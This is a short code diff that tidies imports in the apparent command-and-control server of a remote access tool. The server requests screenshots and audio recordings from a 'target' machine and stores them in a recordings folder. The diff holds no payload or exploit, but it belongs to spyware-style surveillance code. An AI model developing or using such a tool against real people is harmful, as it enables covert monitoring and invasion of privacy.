@@ -6,6 +6,8 @@
 # Import necessary libraries
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
+import base64
+import os
 
 # Import configuration
 from configuration import SERVER_IP, SERVER_PORT
@@ -153,8 +155,7 @@ def target_communication():
             if command == 'screenshot':
                 if isinstance(result, dict) and result.get('action') == 'screenshot':
                     # Save screenshot to server
-                    import base64
-                    import os
+                    
                     
                     # Create recordings directory if it doesn't exist
                     recordings_dir = "recordings"
@@ -176,9 +177,6 @@ def target_communication():
             elif command == 'stop_audio':
                 if isinstance(result, dict) and result.get('action') == 'audio':
                     # Save audio file to server
-                    import base64
-                    import os
-                    
                     recordings_dir = "recordings"
                     if not os.path.exists(recordings_dir):
                         os.makedirs(recordings_dir)
@@ -194,7 +192,6 @@ def target_communication():
                     print(f"Audio: {result}")
             elif command == 'list_recordings':
                 # List recordings from server directory
-                import os
                 recordings_dir = "recordings"
                 if os.path.exists(recordings_dir):
                     files = os.listdir(recordings_dir)
